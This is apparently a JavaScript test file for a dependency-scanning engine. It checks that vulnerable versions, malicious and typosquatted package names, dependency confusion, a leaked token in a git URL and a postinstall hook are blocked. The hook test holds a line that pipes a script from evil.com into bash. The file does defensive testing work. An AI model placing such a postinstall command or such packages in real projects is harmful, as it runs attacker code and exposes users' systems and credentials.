const assert = require('assert');
const { runDependencyEngine, DEP_RULES, parseDeps } = require('../src/engines/dependency');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try { fn(); passed++; console.log(`  ✅ ${name}`); }
  catch (e) { failed++; console.error(`  ❌ ${name}: ${e.message}`); }
}

console.log('\n=== Dependency Engine ===\n');

test('DEP_RULES has at least 8 entries', () => {
  assert.ok(DEP_RULES.length >= 8);
});

test('BLOCK vulnerable lodash version', () => {
  const input = JSON.stringify({ dependencies: { lodash: "^4.17.19" } });
  const r = runDependencyEngine(input);
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK vulnerable axios version', () => {
  const input = JSON.stringify({ dependencies: { axios: "^1.6.0" } });
  const r = runDependencyEngine(input);
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK malicious package name', () => {
  const r = runDependencyEngine("require('event.stream')");
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK typosquat package', () => {
  const r = runDependencyEngine("require('lodashh')");
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK dependency confusion', () => {
  const r = runDependencyEngine('dependencies: { "@internal/secret-lib": "*" }');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK postinstall exec', () => {
  const r = runDependencyEngine('"postinstall": "curl http://evil.com/payload.sh | bash"');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('BLOCK hardcoded token in dep URL', () => {
  const r = runDependencyEngine('git+https://token:ghp_1234567890abcdef1234567890abcdef123456@github.com/user/repo.git');
  assert.strictEqual(r.verdict, 'BLOCK');
});

test('ALLOW for safe dependencies', () => {
  const input = JSON.stringify({ dependencies: { express: "^4.21.0", lodash: "^4.17.21" } });
  const r = runDependencyEngine(input);
  assert.strictEqual(r.verdict, 'ALLOW');
});

test('ALLOW for empty manifest', () => {
  const r = runDependencyEngine(JSON.stringify({ name: "test", version: "1.0.0" }));
  assert.strictEqual(r.verdict, 'ALLOW');
});

test('ERROR for empty input', () => {
  const r = runDependencyEngine('');
  assert.strictEqual(r.verdict, 'ERROR');
});

test('parseDeps extracts dependencies', () => {
  const deps = parseDeps(JSON.stringify({ dependencies: { react: "^18.0.0" } }));
  assert.strictEqual(deps.react, "^18.0.0");
});

console.log(`\n${passed + failed} tests — ${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
